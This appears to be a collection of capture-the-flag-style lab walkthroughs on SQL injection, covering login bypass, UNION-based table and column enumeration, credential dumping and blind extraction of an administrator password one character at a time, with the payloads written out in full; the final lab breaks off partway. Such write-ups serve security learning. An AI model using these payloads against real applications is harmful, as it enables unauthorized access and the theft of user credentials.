# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cb75436f-46d8-4223-a333-d02e2a762328)

Going over to the webpage and clicking on ```Gifts```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6da250fc-c7da-40e0-a2a9-b480799c9b9e)

You should get this,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8d3ff589-b4af-4ebe-b289-e33e0d3092aa)

Now, lets capture this request on burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f3c61aa9-6328-457c-9ef6-759a6445d02d)

Sending the request over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40ce0d22-99e5-4dbf-9505-f49d929d73ab)

To display one or more unreleased products, we can use the payload ```' or 1=1--```, make sure this is url encoded to something like this ```'+or+1%3d1--```.

Adding this payload to the url,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ef4d74eb-dd1b-42e4-ab2b-2d9c795441ca)

cool, the status code is "ok". Viewing the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1e5003b4-7002-4fb4-9f2a-7e0d2206dfea)

Nice, we have successfully solved the lab😎.

------------------------------

# SQL injection vulnerability allowing login bypass
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe917a2c-c5ee-4957-a733-9791d8041234)

Navigating to the webpage and clicking on "My Account"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84e38257-e3d5-4722-b16e-9a736d67ac1e)

You should get this,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f4f46852-8207-4ab0-a157-8523b8b9dda5)

So we are asked to login as the ```administrator``` user, to do this we can use this

username:```administrator'--```          password:```aaaaaaa```

Note: We can either provide a blank password or we use any random stuff for the password since the password will get commented out anyways

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85078867-6d9a-49b4-ae35-f179f3c1ec43)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bcde4b54-e194-499a-ae31-95dfeb16e484)

Cool, we have successfully solved the lab

---------------------

# SQL injection attack, querying the database type and version on Oracle
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1a110c4b-d810-42b6-b7f3-b5f9df4e4544)

Navigating to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a6c32fe1-538c-430b-8725-13a4afaf4e08)

Capturing the request on burpsuite,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6974648d-151b-4b1d-a68e-1aad9dbcf6b6)

First thing to do is to confirm the number of columns available in the database

So, we'll be using the query
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/46cca6a6-9af2-41e9-a473-8f2388847fce)

This means there's a column available in the database,

Trying other queries

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/413576a4-6bb9-4cab-918c-d629f51080fb)

This makes it 2 columns available in the database,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28d25efa-ca02-4434-93ae-a908703068d9)

From the above screenshot you'll see that the query ```' order by 3--``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

So, we have 2 columns available in the database.

To query the database version we can use the following query 
```
' UNION SELECT banner,null FROM v$version--
```
Explaining this
```
The banner column contains the information about the database version
The null is just there to fill in for the second column of the result
v$version is the name of a database table
```
Trying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9f5f9626-7647-445a-8c29-3d021874baf0)

Lets show the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a8001d54-7b63-488e-aa76-10bb21085337)

Nice, we have successfully solved the lab

-------------------------

# SQL injection attack, querying the database type and version on MySQL and Microsoft
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/178842fc-a6ef-4ae6-a5db-6dfe6ad690e9)

Navigating to the webpage, clicking on "Gifts"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2fdc0c82-d053-4b7d-b950-8320359cac38)

Capturing this request on burpsuite and sending it over to burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8492bbd-7d49-4822-acc0-9fb99834b8e1)

Now, lets check the number of columns available in the database using the query
```
' order by 1-- -
' order by 2-- -
' order by 3-- -
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3a425de3-a5bc-45d1-8c42-49ab259a9d9b)

This means we have a column available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4213061d-8978-4139-98a8-969f29cdf0e9)

This means we have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/df69463e-1b78-4785-bedb-a7d2b1ff3fc2)

From the above screenshot you'll see that the query ```' order by 3-- -``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

Now, to display the database version string, we can use  the query
```
' UNION SELECT version(),null-- -
```
Using this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6bc2ab51-98ba-4253-bdb6-54bc1f6c5415)

Now, lets show this response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07d81260-800d-4d88-90df-1e5695deaf95)

Nice, we have successfully completed the task for this lab😎

--------------------------

# SQL injection attack, listing the database contents on non-Oracle databases
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4b71c9e3-4b94-4834-b5c5-a0ee579a0c1e)

Navigate to the webpage and click on "Gift"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d8704324-610b-4fb8-a5c6-3a0d1c436dad)

Capturing the request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e3971a3f-8b29-4e64-89bc-99cde62a1c2f)

First, lets check the number of columns available in this database.

We can do that using the queries
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure you url encode the queries before using themm

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c75e93d5-10f7-4453-a7f2-2a95acf6320e)

Now, this means we have a column available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8e49c5a-f5ab-4ed6-87dd-a445af4f8513)

We have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4331b044-4dec-4b1a-928b-364225933074)

We got an Internal Server Error here, this means there isn't a column 3 available in the database.

Hence, we have 2 columns available in the database.

Lets try to get the version the database is running, we can use the query
```
' UNION SELECT version(),null--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c2c24f3-0b28-422e-bfde-a78afceacc68)

Now, lets check the name of the tables in the database. We can use the query
```
' UNION SELECT table_name,null FROM information_schema.tables--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f027d2a4-0b2b-4abd-a750-168372eaa2fd)

We found a table ```users_vqdnay```.

Next thing to do is to check the name of the columns in the table, we can use the query
```
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_vqdnay'--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e884a31-5c98-4818-9ca8-22dc60184c43)

We got the columns ```username_dgcaur``` and ```password_eygubt```.

Cool, lets dump the contents of the columns using the query
```
' UNION SELECT username_dgcaur,password_eygubt FROM users_vqdnay--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2d0f4291-5858-4a65-a5ac-6936bdad6c32)

We got the credentials for the administrator user

username:```administrator```          password:```7ocf0wre9y16c1llsdp1```

Lets go ahead and log in

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5c976ef-a3bf-48ee-9c21-fe5f8c47832f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6dbc4baf-367b-4b2b-a3f3-adda3da1aeca)

Nice, we have succesfully completed the task for this lab.

---------------------------

# SQL injection attack, listing the database contents on Oracle
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7465f61f-7882-4c1b-8bca-6804b4324362)

Navigate to the webpage and click on "Gifts"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a3fb15da-dd80-4081-930e-49c1266812a7)

Capturing this request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbba3330-c8f3-435b-acaa-b11ccc594079)

Lets start out by checking the amount of columns available in the database. We can use the queries
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure the queries are url encoded before applying them

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2edb3a2-1217-45d6-bd92-f0f04e0e17df)

This means we have a column available in the database

Moving on, 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb6896d2-8423-4d82-9f51-310262faf277)

Now, this means we have 2 columns available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/22478a20-b1c2-47ad-bfea-4bc003391a4d)

The "Internal Server Error" means that there isn't a third column available in the database.

Lets check the version the database is running using the query
```
' UNION SELECT banner,null FROM v$version--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b01f6263-e68a-422f-868b-1deede320ec5)

Cool, we were able to get the version the database is running.

To get the name of the tables in the database, we can use the query
```
' UNION SELECT table_name,null FROM all_tables--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e91fdbe-a352-4f1d-8e76-f2c43f9343e9)

We found the table name ```USERS_DHHSSL```

The next thing to do is check the name of columns available in the table. We can do that using the query
```
' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_DHHSSL'--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/184e3392-f394-4214-b2aa-082e4151600c)

We got the column names ```USERNAME_ZTMDCJ``` and ```PASSWORD_QGFLBW```.

Now, lets go ahead and dump the contents of the columns using the query
```
' UNION SELECT USERNAME_ZTMDCJ,PASSWORD_QGFLBW FROM USERS_DHHSSL--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2fe705e-0b88-47fc-9da8-1d61b0278d1b)

We got the creds for the administrator user

username:```administrator```          password:```8aqefrxiudrdaqkhk3qf```

Lets go ahead and login as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90028565-b596-46bd-a8bd-5f21c86faf87)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6df244bc-a9f2-4fd7-b3f6-7b99e663f298)

Cool stuff, we have successfully completed the task for this lab.

--------------------

#  SQL injection UNION attack, determining the number of columns returned by the query
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e6da08f-142d-4933-afdd-503cc5d581bd)

Navigate to the webpage and click on "Gifts"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2cc819c4-a5e4-4dfb-aa85-71b2d7dd7449)

Capturing this request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5eb74c8c-1139-4f59-9d5b-aa828507f3c6)

We can use ```UNION``` attack to determine the number of column available. We can use the query
```
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
' UNION SELECT null,null,null,null--
```
So, we'll continue the query like that until we get a ```HTTP response code 200 OK```.

Note: You stop the query when you get ```HTTP response code 200 OK```

Url Encode the queries before applying them

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f5cb029b-d976-4fb2-96c8-8d678e5c2060)

This means, there's more than one column in the database, hence why we are getting the  "Internal Server Error"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8cc78ffe-9570-4ef4-8048-56e203fab051)

We got the error, which means there are more than two columns in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7db9fc51-319b-4dfd-9db8-3633b1f97c21)

We got the ```HTTP response code 200 OK```, which means there are 3 columns in the database.

Showing the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7690a347-f9aa-4b07-9894-cbcdefda5a76)

We have successfully completed the task for this lab

-------------------------

# SQL injection UNION attack, finding a column containing text
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/49ec3beb-2101-47b6-af5a-8365f9e59c50)

Navigate to the webpage and click on "Lifestyle"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/feed1a8f-b225-442e-80d9-3c3cc9f0f4bf)

Capturing this request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a6638917-3208-402e-8147-ac6384411c1f)

First, lets determine the number of columns that's available in the database using the query
```
' order by 1--
' order by 2--
' order by 3--
' order by 4--
```
Ensure you url encode the query when you use it.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/35bea675-b7b5-4d8e-993b-ff1ad4d566ed)

This means we have a column available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1303a537-2346-40de-8565-09afe6c89516)

Alright, so we have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4c1dded8-aae8-4cfb-bf45-cf8e5c5ce5b7)

So, there are 3 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/57d2fbcb-1b69-46c3-8028-834fe6d48e15)

We got an "Internal Server Error" meaning there isn't a column 4 in the database

Hence, we have 3 columns available in the database.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50143fc9-d043-43bc-97bd-d2251d5125d7)

So, the task is to check which of the columns is compatible with string data. So, we are asked to return the string ```yuJfMW```.

Now, lets start by using the ```UNION``` method to confirm the number of columns. We can use the query
```
' UNION SELECT null,null,null--
```
If we don't get the "Internal Server Error" it means there truly are 3 columns available in the database. 

Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/201c39b0-c764-4f39-9aa2-86627659a7c7)

cool, now lets look for the vulnerable column that is compatible with string data. We can try the following queries
```
' UNION SELECT 'yuJfMW',null,null--
' UNION SELECT null,'yuJfMW',null--
' UNION SELECT null,null,'yuJfMW'--
```
So, a query not returning the "Internal Server Errror" means the column where the string is positioned is vulnerable.

Applying the queries,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b2d5383-4809-44bb-88ab-a5340f8d49e1)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/029ada9c-28bf-4c1c-af57-1ccfbdf8d784)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40a12261-5a5a-4a57-b383-ce48c57a39bb)

From the above screensots, you'll see that only the query ```' UNION SELECT null,'yuJfMW',null--``` was able to retrieve the string from the database.

Lets try to show the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c7484877-9166-43c9-b72c-0e4867f716d9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e6e6a239-9858-46a9-9b04-e39af6eee080)

Cool, we have successfully solved the lab. So, it is safe to say the second column is compatible with string data.

----------------------

# SQL injection UNION attack, retrieving data from other tables
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6423fe34-f6c3-448e-b70b-3c0ca04d847f)

Navigate to the webpage and click on "Lifestyle"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7f1b7c45-5674-4047-9a70-16d8b0adeb94)

Capturing this request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a1764eb5-41c3-4f7f-aa2a-4b1676306efb)

Now, this should be an easy one since they already gave us the name of the table to be ```users```, also in the table there are columns ```username``` and ```password```. So, what we'll try to do is just determine the number of columns available in the database. We'll be using the query
```
' order by 1--
' order by 2--
' order by 3--
```
Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f921296c-acf7-4567-9d7e-7e7932e7c3ae)

We have a column available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b6c3f781-4138-418c-a666-1e4b54aec0a1)

Alright, so 2 columns are available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/20888d82-965e-4eab-afae-5a895cb76c26)

The "Internal Server Error" displayed is to tell us that there isn't a third column in the database.

So, we have 2 columns available in this database

Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
```
' UNION SELECT username,password FROM users--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/188133f5-c518-4378-8a91-e7beb6682ec5)

Cool, we got the creds for the administrator user

username:```administrator```          password:```nqic8fkyvzqjfez72khh```

Lets try to log in with thi creds

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fd1dc676-0992-4910-a13e-0675c83b495f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9927d49e-288b-4ddc-bce3-9c8902d1f0ad)

Cool, we have successfully completed the task for this lab

-------------------------

# SQL injection UNION attack, retrieving multiple values in a single column
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68681c2b-03cb-47e4-a526-058afecdae0b)

Navigate to the website and click on "Lifestyle"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2b5b9fd-20bc-4964-b804-41e7c23c3d01)

Capturing the request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fdce4358-ea13-417d-bc4a-c2208ff03ed0)

Lets go ahead and check the number of columns available in the database, we can use the queries
```
' order by 1--
' order by 2--
' order by 3--
```
Using these queries

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1ab904ef-0e97-4a99-95a1-20f57decf51d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dae2d6ec-e44a-4dc1-97c9-5f1b3fcd3d12)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/af5e229b-cb77-44fa-b08d-a3a7d374aa9b)

From the above screenshot, it is obvious that we have just 2 columns available in the database.

Lets go ahead and look for the vulnerable column, that is, the column that is compatible with string data. To do that we can use the query
```
' UNION SELECT 'abeg',null--
' UNION SELECT null,'abeg'--
```
url encode the query before using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07eecb17-1072-46b7-be4a-0340a36ebd98)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7878dd78-9ba9-4835-93be-21fe94096f33)

It is evident that the second column is actually compatible with string data.

Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query

```
' UNION SELECT null,username || '~' || password FROM users--
```
Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dcc65a68-30c2-454e-ba9d-b3d21b573f99)

Cool, we got the creds for the administrator user.

username:```administrator```            password:```6tp172ew9j1sy5f7vx3d```

Lets try to log in with this creds we found

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2355ff27-ebbd-41ac-aaee-afb814bc8296)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/690e1d70-a897-471b-a9ea-ac3434922bb2)

Cool, we have successfully solved this lab.

------------------------------

#  Blind SQL injection with conditional responses
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cebd199e-fcb5-44c9-a0f9-97a8940ad3e4)

So, the application uses a tracking cookie for analytics

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c77d83c7-57c6-47f1-8b96-d1eee6311e30)

Click "View details" then capture the request on burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e0791be6-76f1-4b3d-a046-964ef73eac0d)

Now, lets use conditional responses to check if it is vulnerable to blind SQLi. We can use the queries
```
' AND '1'='1
' AND '1'='2
```
Ensure it is url encoded when using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed0b312f-16d3-45cb-afa2-c542203d35d6)

From the above screenshot we got the 'Welcome back!' message, this is because the condition ```'1'='1``` is always true.

Trying the second query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/912710c8-2b29-4f03-9a30-4391fec44413)

So, this didn't return the 'Welcome back!' message, this is because the condition ```'1'='2``` is always false.

Now, that we have confirmed that it is vulnerable, lets go ahead to obtain the password since we know the table name to be ```users``` and the name of the columns in the tables are ```username``` and ```password```. Also, we have the username to be ```administrator```.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2690fe5b-55ac-4c47-8df8-e65719fd9f4e)

Based on the hint we were provided, I think we now know what to focus on

To achieve this, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 's
```
Alright so, we'll be trying the letters all the way from ```a-z```, we'll also try the numbers ```0-9```, until we get a "Welcome back!" message

Trying this query you should get the first character of the password
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p
```
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbe640e7-9de5-4c93-b602-5153d527ee1c)

Cool, now that we got the first character, lets go ahead and query for the second character, We can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'q
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bf2a6326-efe4-44a3-baeb-b409234a4bb4)

Getting the 3rd character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'l
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a431dd64-b56d-4110-b33d-d78dac3d22de)

Getting the 4th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 4, 1) = '8
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/24c57afa-5628-4c52-9683-b4a5a44c8ea5)

Getting the 5th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 5, 1) = 'z
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/58770009-2009-4ad7-838c-d6cdc6994fc4)

Getting the 6th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 6, 1) = 's
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a08b330c-8929-4189-9f1c-b58b05959e06)

Getting the 7th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 7, 1) = 'm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0d55d2e0-1f44-4bf5-a015-61f9624e9bc4)

Getting the 7th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'j
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dc6e9cfb-a1db-473d-ae1c-42a8d40f856a)

Getting the 8th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 8, 1) = 'j
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/41f1714a-cfcc-4c96-bf35-c6f5d458405e)

Getting the 9th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 9, 1) = 'x
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8aa8b3b9-4588-46ec-80ef-0c010168d0b1)

Getting the 10th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 10, 1) = 'r
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/62ed9426-e9b8-403c-8b30-cbb75c92a49a)

Getting the 11th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 11, 1) = '7
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3015b5af-90f7-481d-92d1-b515cb8cdf66)

Getting the 12th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 12, 1) = 'b
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f2882032-2e5a-4e5d-b193-ff13edae63ed)

Getting the 13th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 13, 1) = 'i
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/347270ba-c25e-432b-8e97-bff5ca068e0b)

Getting the 14th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 14, 1) = 'i
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f9d92107-ce88-4444-be44-191d5e9b72ba)

Getting the 15th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 15, 1) = 'y
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e906e12-547c-4127-b9c5-fbbaac43cfee)

Getting the 16th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 16, 1) = 'l
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f591a1c0-a458-4e9b-8b66-88bb421c95a3)

Getting the 17th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 17, 1) = 'u
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3f78d1c3-c72d-4f15-959b-86a35ff49521)

Getting the 18th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 18, 1) = 'q
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/31af27ef-2ed1-43ea-b03a-43a11e29f44e)

Getting the 19th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 19, 1) = 't
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a34f82d5-0e55-43bf-9b2a-20588d7532a6)


Getting the 20th character, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 20, 1) = 'j
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/01eaccbe-1d05-43c7-82d7-28b4611a75b5)

So we got the final password to be ```pql8zsmjxr7biiyluqtj```. Lets try to login as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c55b62f0-3daa-40b0-9b36-89cc599fc071)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fd66ec16-64e8-4da4-a8c9-4dd8a017244e)

Nice, we have successfully solved this lab

----------------------------

# Blind SQL injection with conditional errors
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/01eefd1c-7e06-4b4b-b11d-7ffb3ed52888)

Navigate to the webpage and click on "view details"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8859de69-7dad-4974-a986-359b5446525e)

Capturing the request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/12ff50fb-095a-4758-9a21-3f04be353cb9)

Now, lets start by testing conditions.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/809423b2-153b-4acf-a7bc-ff430cb59f0c)

From the hint provided we can see that this lab uses the oracle dabase

So, using this query we should be able to test the conditions
```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```
Ensure you url encode this before using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85c9f86a-c57f-4955-94f4-8c930ab8fa2e)

We got the "Internal Server Error", this is because ```1=1``` will always be true at all times

Trying the second query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed83e499-8087-4ba2-bd74-863bb51a298a)

This query didn't throw an error because the condition ```1=2``` is not true






























